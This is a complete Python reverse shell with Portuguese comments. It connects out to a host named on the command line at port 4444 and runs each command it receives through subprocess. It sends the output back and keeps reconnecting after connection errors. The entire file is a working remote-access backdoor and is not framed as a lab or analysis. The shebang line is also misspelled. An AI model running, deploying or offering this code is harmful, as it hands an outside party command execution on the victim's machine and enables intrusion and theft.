#!/usr/bin/env pytyhon3
# -*- coding: utf-8 -*-

import socket
import subprocess
import os, sys
import time

ip = sys.argv[1]
ip = socket.gethostbyname(ip)
port = 4444

def main():
    try:
        # criando socket e conectando

        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        s.connect((ip,port))

        # recebendo comandos

        while True:
            command = s.recv(1024).decode()
            if "close" in command:
                s.close()
                break
            
            elif "cd" in command:
                os.chdir(command[3:])
                s.send(str.encode(os.getcwd()) + str.encode("\n"))
              
            else:
                proc = output = subprocess.getoutput(command)
                #output_str = str(proc)
                s.send(proc.encode())
                
    except ConnectionResetError:
        s.close()
        time.sleep(5)
        main()

    except ConnectionAbortedError:
        s.close()
        time.sleep(5)
        main()
        
    except ConnectionRefusedError:
        s.close()
        time.sleep(5)
        main()           
               
main()
